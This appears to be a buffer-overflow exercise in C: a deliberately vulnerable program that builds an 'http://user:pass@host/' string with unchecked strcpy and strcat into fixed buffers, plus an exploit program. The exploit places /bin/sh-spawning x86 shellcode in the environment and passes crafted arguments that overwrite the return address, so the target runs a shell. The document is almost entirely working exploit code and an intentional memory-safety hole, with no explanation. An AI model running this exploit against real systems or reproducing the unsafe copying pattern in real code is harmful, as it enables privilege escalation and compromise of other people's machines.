// program.c (vulnerable)
#include <stdio.h>
#include <string.h>

char username[64], password[64], hostname[64];

int main(int argc, char **argv) {
    char result[256];

    if (argc != 4 ||
        strlen(argv[1]) > sizeof(username) ||
        strlen(argv[2]) > sizeof(password) ||
        strlen(argv[3]) > sizeof(hostname)) {
        fprintf(stderr, "bad arguments\n");
        return -1;
    }

    strcpy(username, argv[1]);
    strcpy(password, argv[2]);
    strcpy(hostname, argv[3]);

    result[0] = 0;
    strcat(result, "http://");
    strcat(result, username);
    strcat(result, ":");
    strcat(result, password);
    strcat(result, "@");
    strcat(result, hostname);
    strcat(result, "/");

    printf("%s\n", result);
    return 0;
}

// exploit.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define VULN "/path/to/program"

unsigned char code[] =
    "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
    "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";

int main(void) {
    unsigned int addr, i;
    char *A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0";
    char *B = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\0";
    char *C = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xc0\xff\xff\xbf";
    char *n[] = { VULN, A, B, C, NULL };
    char *env[] = { code, NULL };

    addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(code) - 1;
    fprintf(stderr, "Using address: %#010x\n", addr);

    execve(n[0], n, env);
    perror("execve");
    exit(1);
}

// makefile
// exploit: exploit.c
//     gcc -o exploit exploit.c
